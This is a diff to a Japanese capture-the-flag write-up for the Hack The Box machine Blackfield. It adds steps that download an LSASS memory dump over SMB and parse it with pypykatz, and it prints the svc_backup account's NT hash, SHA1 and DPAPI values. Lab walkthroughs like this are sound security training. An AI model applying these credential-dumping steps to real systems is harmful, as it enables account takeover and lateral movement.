@@ -121,7 +121,9 @@ Try "help" to get a list of possible commands.
 smb: \>
 ```
 
-次のように、怪しいtxtファイルがある：
+# initial shell
+
+lsassに関するファイルがあったのでダウンロードする：
 
 ```
 smb: \> dir
@@ -130,41 +132,61 @@ smb: \> dir
   commands_output                     D        0  Mon Feb 24 03:14:37 2020
   memory_analysis                     D        0  Fri May 29 05:28:33 2020
   tools                               D        0  Sun Feb 23 22:39:08 2020
-
-		5102079 blocks of size 4096. 1672550 blocks available
-smb: \> cd commands_output\
-smb: \commands_output\> dir
-  .                                   D        0  Mon Feb 24 03:14:37 2020
-  ..                                  D        0  Mon Feb 24 03:14:37 2020
-  domain_admins.txt                   A      528  Sun Feb 23 22:00:19 2020
-  domain_groups.txt                   A      962  Sun Feb 23 21:51:52 2020
-  domain_users.txt                    A    16454  Sat Feb 29 07:32:17 2020
-  firewall_rules.txt                  A   518202  Sun Feb 23 21:53:58 2020
-  ipconfig.txt                        A     1782  Sun Feb 23 21:50:28 2020
-  netstat.txt                         A     3842  Sun Feb 23 21:51:01 2020
-  route.txt                           A     3976  Sun Feb 23 21:53:01 2020
-  systeminfo.txt                      A     4550  Sun Feb 23 21:56:59 2020
-  tasklist.txt                        A     9990  Sun Feb 23 21:54:29 2020
+smb: \> cd memory_analysis\
+smb: \memory_analysis\> dir
+  .                                   D        0  Fri May 29 05:28:33 2020
+  ..                                  D        0  Fri May 29 05:28:33 2020
+  conhost.zip                         A 37876530  Fri May 29 05:25:36 2020
+  ctfmon.zip                          A 24962333  Fri May 29 05:25:45 2020
+  dfsrs.zip                           A 23993305  Fri May 29 05:25:54 2020
+  dllhost.zip                         A 18366396  Fri May 29 05:26:04 2020
+  ismserv.zip                         A  8810157  Fri May 29 05:26:13 2020
+  lsass.zip                           A 41936098  Fri May 29 05:25:08 2020
+  mmc.zip 
+...
+smb: \memory_analysis\> get lsass.zip
+getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (1884.9 KiloBytes/sec) (average 1345.9 KiloBytes/sec)
 ```
 
-すべてダウンロードする：
-
+解凍するとlsass.DMPが得られた！！
 ```
-smb: \commands_output\> mask ""
-smb: \commands_output\> recurse ON
-smb: \commands_output\> prompt OFF
-smb: \commands_output\> mget *
-getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
-getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (1.1 KiloBytes/sec) (average 0.7 KiloBytes/sec)
-getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (15.7 KiloBytes/sec) (average 5.5 KiloBytes/sec)
-getting file \commands_output\firewall_rules.txt of size 518202 as firewall_rules.txt (183.1 KiloBytes/sec) (average 88.2 KiloBytes/sec)
-getting file \commands_output\ipconfig.txt of size 1782 as ipconfig.txt (1.1 KiloBytes/sec) (average 70.3 KiloBytes/sec)
-getting file \commands_output\netstat.txt of size 3842 as netstat.txt (2.4 KiloBytes/sec) (average 58.7 KiloBytes/sec)
-getting file \commands_output\route.txt of size 3976 as route.txt (3.8 KiloBytes/sec) (average 53.1 KiloBytes/sec)
-getting file \commands_output\systeminfo.txt of size 4550 as systeminfo.txt (4.3 KiloBytes/sec) (average 48.6 KiloBytes/sec)
-getting file \commands_output\tasklist.txt of size 9990 as tasklist.txt (9.5 KiloBytes/sec) (average 45.3 KiloBytes/sec)
+┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
+└─$ unzip lsass.zip
+┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192/Lsass]
+└─$ ls             
+lsass.DMP  lsass.zip
 ```
 
+`pypykatz`で中身を読み出す：
+
+```
+┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
+└─$ pypykatz lsa minidump lsass.DMP
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+        == MSV ==
+                Username: svc_backup
+                Domain: BLACKFIELD
+                LM: NA
+                NT: 9658d1d1dcd9250115e2205d9f48400d
+                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
+        == WDIGEST [633ba]==
+                username svc_backup
+                domainname BLACKFIELD
+                password None
+        == Kerberos ==
+                Username: svc_backup
+                Domain: BLACKFIELD.LOCAL
+...
+```
 
 
 
